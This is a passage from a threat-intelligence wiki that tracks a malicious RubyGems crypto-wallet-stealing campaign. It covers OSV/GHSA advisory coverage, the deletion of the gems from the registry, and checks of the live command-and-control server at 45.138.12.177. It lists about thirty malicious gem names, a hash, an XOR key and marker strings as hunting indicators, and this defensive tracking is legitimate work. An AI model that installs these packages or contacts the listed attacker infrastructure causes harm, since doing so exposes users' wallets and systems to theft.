- **Artifact custody:** with the listener dead, this wiki's capture (full tarball read + component-level analysis on this page) is plausibly the only public copy of the Wallet Guard kit — same custody position as the `NaorYaa/Test` reverse-shell pair for the Wix wave-3 stage. The `33276fed…` hash + `wgkit`/`usv\x9a` grammar remain the hunt keys.

**Monitor update:** `:8092` return OR migration to a new host on the same grammar promoted to the top of the watch list; exfil/shell-port death still pending; wallets still cold (not re-probed this sweep, inbound alert standing).

## <a id="october-6-ghsa-wave"></a>October 6 follow-up (~07:05–07:45 UTC, eighty-ninth sweep): THE GHSA WAVE LANDED — 31 RubyGems records published SAME-SECOND Oct 5 18:34:14Z; the advisory lanes are now COMPLETE (OSV 42/48 + this mirror) and the ONLY surviving gap is the four names still missing from both

The advisory-blindness story this fleet anchored is finished, and finished in the shape the eighty-sixth/eighty-seventh sweeps predicted: the GHSA malware lane completed its catch-up **posthumously**, one same-second batch.

- **The batch (this wiki, GitHub advisories API):** **31 RubyGems records published 2026-10-05T18:34:14Z** — `web3-eth-utils`, `web3-sign-helper`, `tx-broadcast-utils`, `lightning-invoice-utils`, `wallet-crypto-utils`, `utxo-set-utils`, `ethereum-tx-helper`, `wallet-backup-tool`, `ligbtning-invoice`, `lightinng-invoice`, `lighthing-invoice`, `etherdum.rb`, `etheremu.rb`, `hdkey-derive-helper`, `tron-rb`, `bitcoin-rpc-lite`, `eth-address-utils`, `keccka`, `kecack`, `crypto-mnemonic-tools`, `btc-wallet-tools`, `cryoto-toolbox`, `crylto-toolbox`, `crypti-toolbox`, `solaan-ruby`, `merkle-proof-lite`, `coinmarket-utils`, `eth-keystore-utils`, `electrum-protocol-lite`, `crypto-key-utils`, `blockchain-sync-utils` — every one `= 1.0.0`, none patched. Sampled descriptions carry the **amazon-inspector** source header and the `ext/req_throttle_mini/extconf.rb` no-sources-shipped detail = the machine lane's own backfill, not the curated lane.
- **Final advisory ledger for the 48-name fleet:** OSV 42/48 (the eighty-third's catch-up) + GHSA same-second mirror on the RubyGems malware class — the `Malicious code in <name> (RubyGems)` string that had been FROZEN at `@badzz88/baileys` (Sep 30) for six straight sweeps moved twice in hours: first the `web3-eth-utils`-class 31-name batch 18:34:14Z, then `dotenv-async` 00:20:26Z Oct 6 (npm, `GHSA-gp83-4g76-4qg5`, generic compromised-PC text). **The malware-lane mirror freeze is CLOSED — it thawed in catch-up bursts, not live-mirror cadence** (the Oct 6 06:30:32Z six-name batch — five `internallib_v*`/`@pinecone-experience` + `hardhat-init` — DID mirror same-night, so live mirroring may have resumed too; next sweep's discriminator: does the NEXT fresh OSV name get a GHSA within the hour?).
- **The gap that survived both lanes (four names):** `reqthrottle-3474` (the CAMPAIGN ANCHOR — the account-name gem whose `extconf.rb` was the reference payload), `reqthrottle_mini`, `eth-wallet-tools` — all `affects=` queries return ZERO on GHSA and ZERO on OSV — plus the six correctly-excluded clean fillers (last one `quota-bucket`, curated-lane-verified unadvised by design). The anchor name being the one the machines can't see is the durable lesson restated: **advisory-keyed consumers never saw the account itself — account-level and grammar-level detection (`req_throttle_mini` leftover path, `usv\x9a` XOR key, `wgkit` string) remains the belt to the advisory braces.**
- **Heartbeats at this check:** `:8092` dead SIXTH straight check (connection-refused); `:8080/w` **200 ARMED**; `:8089`/`:8090` OPEN = box still live, stage still gone; custody position unchanged (`33276fed…` capture standing); wallets not re-probed this sweep (explorer gates standing), inbound alert open.

**Monitor update:** `:8092` return/migration unchanged at top; NEW discriminator — fresh-name GHSA mirror latency (live-mirror resumed vs burst-only); whether `reqthrottle-3474`/`reqthrottle_mini`/`eth-wallet-tools` ever draw any record; RubyGems GHSA records now count as a first-class query surface for this fleet.

## <a id="october-6-ninetieth-erasure"></a>October 6 second follow-up (~09:25–10:10 UTC, ninetieth sweep): ERASURE DEEPENED PAST THE DEATH-LADDER FLOOR — the three ADVISORY-BLIND ANCHOR names are now bare-404 at every layer, HTML tombstone included, while still carrying ZERO OSV + ZERO GHSA

The eighty-second's ladder mechanic said the HTML page `/gems/<name>` keeps serving 200 even after API erasure + index rebuild + CDN 403 complete — soft preservation as the registry's last layer. This sweep that layer broke, and it broke selectively:

- **Bare-404 at EVERY layer (HTML 404 + API 404 + compact index "This gem could not be found" + tarball 403):** `reqthrottle_3474` (the account-name CAMPAIGN ANCHOR), `reqthrottle_mini`, `eth-wallet-tools`.
- **Soft-200 HTML preserved over empty-version index (`---` rows):** sampled shells `wallet-crypto-utils`, `bitciin` (HTML 200, API 404, compact index `---`, tarball 403); `rate-limit-mini` + `quota-bucket` carry the same empty-`---` index rows (HTML layer not sampled on those two).
- **The advisory gap survived the deeper erasure:** `affects=` (GHSA) and OSV name queries on all three anchors re-run this sweep — still ZERO records each. Whatever drove the deeper deletion did not consult the advisory map, and the advisory map never covered these names anyway.
- **C2 end-state re-verified:** `:8092` connection-refused SEVENTH straight check; `:8080 /w` 200 ARMED; `:8089`/`:8090` OPEN. Wallets not re-probed (explorer gates standing); monetization still zero-confirmed.

**Durable close on the advisory-blindness arc:** the fleet's public shape is now final — 48 gems published in 64 minutes, 42 posthumous OSV records, a same-second GHSA mirror, a registry death laddered end-to-end inside hours… and the one name that IS the campaign (its account, its reference `extconf.rb`) exists in no machine-readable advisory ever published and is now erased from the registry past its own tombstone page. A defender who followed every official feed to the letter never learned the anchor name existed. Grammar-level hunting (`req_throttle_mini` leftover path, `usv\x9a` XOR key, `wgkit`/`Wallet Guard` strings, the `45.138.12.177` set) remains the only complete map of this campaign — this page is that map.

**Monitor update:** the bare-vs-soft-200 split is a new observable — watch whether the soft-200 shells lose their HTML pages too (erasure sweeping fleet-wide) or keep them (deletion targeted at report-triage names); everything else unchanged.

## Related pages

- [algamil7x npm DNS-exfil recon cluster](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md) — this wiki's OSV high-water sweep that surfaced the first four advisories of this fleet
- [ltidisafe GCS-loader npm fleet](ltidisafe-gcs-loader-npm-dependency-confusion-fleet-whltd1-oastify-october-2026.md) — same machine-only advisory blindness, five-month npm precedent
- [DirtyBlanket npm→AUR→SSH worm](dirtyblanket-npm-express-clone-linux-worm-wayback-codeberg-aur-chaos-tor-safedep-september-2026.md) — same week's class of attacker-built toolkit-as-package
